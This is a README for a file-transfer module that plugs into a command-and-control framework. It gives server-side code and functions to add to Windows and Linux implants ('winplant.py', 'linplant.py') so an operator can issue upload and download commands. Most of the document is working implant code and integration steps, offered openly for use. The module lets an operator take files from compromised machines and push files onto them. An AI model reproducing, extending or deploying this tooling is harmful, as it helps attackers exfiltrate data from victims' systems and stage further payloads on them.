# File Transfer Module

[![ko-fi](https://ko-fi.com/img/githubbutton_sm.svg)](https://ko-fi.com/M4M03Q2JN)

This module adds a function file called transfer.py to the project, which can be used to upload and download files to and from the C2 server.

# Usage

### smtp.py 

1. Create a new folder called "functions", and add the transfer.py file to it. 
2. Inside of the sockserver.py file, add the following imports:
```
import os.path
from functions.transfer import upload_file, download_file
```
3. Inside of the target_comm function of the main script, add the following
```
            elif message[:7] == 'upload ':
                filename = message[7:]
                upload_file(filename)
            elif message[:9] == 'download ':
                filename = message[9:]
                print(filename)
                try:
                    if os.path.exists(filename):
                        print('file exists')
                        filename = os.path.basename(filename)
                        download_file(filename)
                    else:
                        print('False')
                        response = '0'
                        response = bytes((response), encoding='utf8')
                        secure_sock.send(response)
                except FileNotFoundError:
                    pass
```
3. Inside of both the winplant.py and linplant.py files, add the following functions:
```
def upload_file(file_name):
    try:
        f = open(file_name, 'wb')
        secure_sock.settimeout(2)
        chunk = secure_sock.recv(8192)
        while chunk:
            f.write(chunk)
            try:
                chunk = secure_sock.recv(8192)
            except socket.timeout as e:
                break
        secure_sock.settimeout(None)
        f.close()
    except Exception as e:
        print(e)


def download_file(file_name):
    try:
        f = open(file_name, 'rb')
        while True:
            try:
                bytes_read = f.read(8192)
                if not bytes_read:
                    break
                secure_sock.send(bytes_read)
            except Exception as e:
                print(e)
    except Exception as e:
        print(e)
```
4. Inside of the session_handler function of both payloads, add the following:
```
            elif message[:7] == 'upload ':
                filename = message[7:]
                filename = os.path.basename(filename)
                upload_file(filename)
            elif message[:9] == 'download ':
                filename = message[9:]
                download_file(filename)
```

### Functionality 
Using the ```upload``` and ```download``` commands followed by the file name to send, you can transfer files to and from.
